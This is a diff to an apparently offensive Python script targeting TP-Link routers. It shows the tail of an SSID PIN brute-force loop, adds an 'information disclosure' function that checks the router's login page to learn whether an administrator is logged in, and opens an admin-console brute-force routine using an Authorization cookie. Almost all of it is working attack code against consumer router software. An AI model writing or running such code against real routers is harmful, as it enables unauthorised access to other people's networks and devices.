@@ -39,7 +39,6 @@ def ssid_brute(ssid: str)->None:
         for i in range(52445720, 52445730):
             pin = f"{i:08d}"
             if ssid_authentication(ssid, pin):
-                print(f"Found PIN: {pin}")
                 break
     elif choice == "2":
         area_code = input("What is the area code?: ").strip()
@@ -49,6 +48,18 @@ def ssid_brute(ssid: str)->None:
     else:
         print("Invalid option")
 
+#Attack 2 Information Disclosure
+def query_admin_status(target_url: str)-> None:
+    try:
+        response = requests.get(target_url)
+        if response.status_code == 200:
+            if "The router allows only one administrator to login at the same time, please try again later." in response.text:
+                print(f"[+] Information Disclosure: Admin user is currently logged into the TP-Link")
+            else:
+                print(f"[-] Admin user is not logged into the TP-Link, try again later...")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Connection error: {e}")
+    
 #Attack 3 Admin Console Brute Force
 def attempt_admin_login(target_url: str , token: str)-> bool:
     session_cookie = {"Authorization": token}
